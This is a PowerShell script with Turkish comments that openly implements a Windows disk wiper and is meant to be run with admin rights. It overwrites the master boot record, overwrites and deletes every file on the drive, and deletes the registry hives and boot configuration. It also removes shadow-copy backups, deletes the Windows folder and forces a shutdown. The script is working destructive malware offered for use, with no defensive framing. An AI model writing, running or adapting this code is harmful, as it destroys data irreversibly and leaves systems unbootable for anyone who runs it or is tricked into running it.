# save as: destroy.ps1 - Admin yetkisiyle çalıştır
function Invoke-WindowsDestruction {
    param([string]$Drive = "C")
    
    Write-Host "🚨 WINDOWS DESTRUCTION STARTED..." -ForegroundColor Red
    
    # 1. MBR Overwrite
    Write-Host "[1/7] Destroying MBR..." -ForegroundColor Yellow
    $mbrData = New-Object byte[] 512
    Set-Content -Path "\\.\$($Drive):" -Value $mbrData -Encoding Byte -Force
    
    # 2. File System Destruction  
    Write-Host "[2/7] Destroying files..." -ForegroundColor Yellow
    Get-ChildItem -Path "$($Drive):\" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            if($_.PSIsContainer) {
                Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
            } else {
                # Random data ile overwrite
                $randomBytes = New-Object byte[] $_.Length
                (New-Object Random).NextBytes($randomBytes)
                Set-Content -Path $_.FullName -Value $randomBytes -Encoding Byte -Force
                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    }
    
    # 3. Registry Destruction
    Write-Host "[3/7] Destroying registry..." -ForegroundColor Yellow
    Start-Process -FilePath "reg" -ArgumentList "delete HKLM /f" -WindowStyle Hidden -Wait
    Start-Process -FilePath "reg" -ArgumentList "delete HKCU /f" -WindowStyle Hidden -Wait
    
    # 4. System Files
    Write-Host "[4/7] Killing system files..." -ForegroundColor Yellow
    Get-Process | Stop-Process -Force -ErrorAction SilentlyContinue
    Get-Service | Stop-Service -Force -ErrorAction SilentlyContinue
    
    # 5. Boot Configuration
    Write-Host "[5/7] Destroying boot..." -ForegroundColor Yellow
    bcdedit /delete {current} /f
    bootrec /fixmbr
    bootrec /fixboot
    
    # 6. Shadow Copies
    Write-Host "[6/7] Removing backups..." -ForegroundColor Yellow
    vssadmin delete shadows /all /quiet
    
    # 7. Final System Wipe
    Write-Host "[7/7] Final destruction..." -ForegroundColor Red
    $wshell = New-Object -ComObject Wscript.Shell
    $wshell.Run("cmd /c takeown /f C:\Windows /r /d y && icacls C:\Windows /grant %USERNAME%:F /t && rd /s /q C:\Windows", 0, $false)
    
    # Force Shutdown
    Write-Host "💀 SYSTEM DESTROYED - SHUTTING DOWN..." -ForegroundColor Red
    shutdown /s /f /t 0
}

# ÇALIŞTIRMAK İÇİN:
# Invoke-WindowsDestruction -Drive "C"
